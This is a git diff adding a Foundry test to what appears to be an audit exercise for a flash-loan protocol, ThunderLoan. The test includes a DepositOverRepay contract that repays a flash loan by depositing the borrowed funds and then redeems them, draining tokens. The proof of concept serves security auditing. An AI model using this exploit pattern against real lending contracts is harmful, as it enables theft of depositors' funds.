@@ -10,6 +10,7 @@ import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {ERC20Mock} from "../mocks/ERC20Mock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -194,9 +195,57 @@ contract ThunderLoanTest is BaseTest {
         console.log("endingtotalFees",endingtotalFees);
         assert(endingtotalFees < calculatedFeeNormal);
     }
+
+    function testUseDepositInsteadToRepayFunds() public setAllowedToken hasDeposits{
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+        uint256 amountToBorrow = 50e18;
+        vm.startPrank(user);
+        tokenA.mint(address(dor),1e18);
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+        dor.redeemMoney();
+        vm.stopPrank();
+        assert(tokenA.balanceOf(address(dor)) > amountToBorrow);
+    }
+
 }
 
-contract MaliciousFlashLoanReceiver {
+
+contract DepositOverRepay is IFlashLoanReceiver {
+
+    IERC20 s_token;
+    ThunderLoan thunderLoan;
+    uint256 s_amount;
+
+    constructor(address _thunderLoan) {
+    thunderLoan = ThunderLoan(_thunderLoan);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address ,
+        bytes calldata 
+    ) external returns (bool){
+        s_token = IERC20(token);
+        s_amount = amount;
+        IERC20(token).approve(address(thunderLoan),100e18);
+        thunderLoan.deposit(s_token, amount+fee);
+        return true;
+    }
+
+    function redeemMoney() external{
+        thunderLoan.redeem(s_token, 49e18);
+    }
+
+}
+
+
+
+
+
+
+contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
     BuffMockTSwap tswap;
     ThunderLoan thunderLoan;
     address repayAddress;
@@ -246,3 +295,5 @@ contract MaliciousFlashLoanReceiver {
     }
 
 }
+
+
